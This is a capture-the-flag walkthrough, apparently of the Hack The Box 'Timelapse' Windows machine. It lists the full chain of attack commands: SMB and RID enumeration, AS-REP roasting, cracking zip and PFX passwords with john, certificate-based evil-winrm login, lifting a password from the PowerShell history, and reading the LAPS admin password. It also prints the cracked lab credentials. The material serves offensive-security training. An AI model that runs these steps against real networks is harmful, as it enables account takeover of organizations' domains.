---
Status: Done
OS: Windows
Difficulty: Easy
tags:
  - LAPS
  - SMB
  - History
Date: 2026-06-21T21:45:00
Owned: 2026-06-22T01:28:00
---

---
# IP 10.129.227.113

# Enumeration
## port scan
```sh
rustscan -a 10.129.227.113 --ulimit 5000 | tee rust.txt
```

start with port scan as usual  
many ports are open  
![[Pasted image 20260621214804.png]]

for detailed scan imma use port from rust as a input to nmap  
```sh
cat rust.txt | grep "open  " | cut -d "/" -f1 | tr '\n' ','
```
got the port list then run nmap  
```sh
grc nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49669,49677,49678,49696 10.129.227.113 -sV -v -oN nmap.txt
```
output  
![[Pasted image 20260621224533.png]]
## Username gathering 
Trying to find more info stumble upon exiftool for metadata incase there is password in some description  
![[Pasted image 20260621222444.png]]
found more username  
also more from rid-brute  
```sh
nxc smb 10.129.227.113 -u 'a' -p '' --rid-brute --log ridbrute.txt
```
don't forget --log so we can have saved result  
![[Pasted image 20260621223502.png]]
let's add the user found to the user.txt  
![[Pasted image 20260621223856.png]]
```sh
grep -i "sidtypeuser" ridbrute.txt | cut -d "\\" -f2 | cut -d " " -f1 >> user.txt
```

try asreproast for hashes  
```sh
nxc ldap 10.129.227.113 -u user.txt  -p '' --asreproast hash.asrep
```
![[Pasted image 20260621230308.png]]

form nmap there isn't a webpage gonna check out the SMB first which is port 139 and 445  

![[Pasted image 20260621215022.png]]

Can access shares with guest let's see the content of share "Shares"  
Connect as user "a" then  enter blank for password  
```
impacket-smbclient timelapse.htb/a@10.129.227.113
```

![[Pasted image 20260621215318.png]]

# Shell as legacyy
inside the shares there is folder with files inside let's get the file and check them out  
tried to unzip the file but there is password needed
![[Pasted image 20260621215416.png]]
we can also use -l to view file list  
![[Pasted image 20260621232147.png]]
I look for the password in .docx and .msi by grepping but doesn't find anything interesting  
Remembered there is a way to crack zip password

```sh
zip2john winrm_backup.zip > hash.txt
```

we wil get the pkzip hash then we crack with john  
```
john hash.txt
```

![[Pasted image 20260621220808.png]]  
While it is running we will check something else  
It's taking kinda long don't think this will work but will leave it running just in case  
We can tell john which wordlist to use
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20260621232429.png]]
the password is supremelegacy  
Note: I did try to use wordlists earlier but I use the wrong syntax  
`john hash.txt --wordlist /usr/share/wordlists/rockyou.txt`

unzip the file  
![[Pasted image 20260622004356.png]]
got the pfx file, now we repeat the process using john again
![[Pasted image 20260622004603.png]]
got the password for pfx we can now extract key  
here is how to use pfx to remote to winrm https://notes.shashwatshah.me/windows/active-directory/winrm-using-certificate-pfx
```sh
openssl pkcs12 -in 0xEr3bus.pfx -nocerts -out privateo.pem
openssl pkcs12 -in 0xEr3bus.pfx -clcerts -nokeys -out cert.crt
openssl rsa -in private.pem -out private2.pem
evil-winrm -i 10.xx.xx.xx -u <UserName> -k $PWD/private2.pem -c $PWD/cert.crt -p ''
```
Extract the key  
![[Pasted image 20260622005658.png]]  
Dump the Cert  
![[Pasted image 20260622005715.png]]  
Decrypt the Key  
![[Pasted image 20260622005728.png]]  
Got Shell as legacyy  
```sh
evil-winrm -i 10.129.7.216 -u legacyy -S -k $PWD/private2.pem -c $PWD/cert.crt
```
![[Pasted image 20260622010158.png]]  
The user flag is on Desktop  
![[Pasted image 20260622010313.png]]
# Shell as svc_deploy

check priv  
![[Pasted image 20260622010750.png]]

check history  
```powershell
Get-History
```
this one didn't work  

get from the path  
```powershell
(Get-PSReadlineOption).HistorySavePath
```
![[Pasted image 20260622010949.png]]
found a cleartext password for `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`  
![[Pasted image 20260622011152.png]]

Let's evil-winrm again using the new cred we found  
```sh
evil-winrm -i 10.129.7.216 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```
don't forget to add -S to enable ssl
![[Pasted image 20260622011609.png]]
check groups
```
net user svc_deploy
```
![[Pasted image 20260622011729.png]]  
tried to get to Admin's desktop got permission denied  

# LAPS to root
LAPS is use so DC can manage local admin password for computer on the domain. 
LAPS will change local password periodically.
To Read LAPS password we can run
```
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```
![[Pasted image 20260622012406.png]]

now we got the password for local Admin  `3B;cE3K&GGnc#m!0Qi(Hh#hQ`  
Let's try to connect once again  

```sh
evil-winrm -i 10.129.7.216 -u administrator -p '3B;cE3K&GGnc#m!0Qi(Hh#hQ' -S
```

success!  
![[Pasted image 20260622012515.png]]
Note: the reason there is not flag on Admin's desktop is HTB labs need to be able to access Administrator account with password. Since this machine have LAPS setup the password always change. So there is another account for the root flag
![[Pasted image 20260622012651.png]]  
here we go  
![[Pasted image 20260622012726.png]]
![[Pasted image 20260622012850.png]]
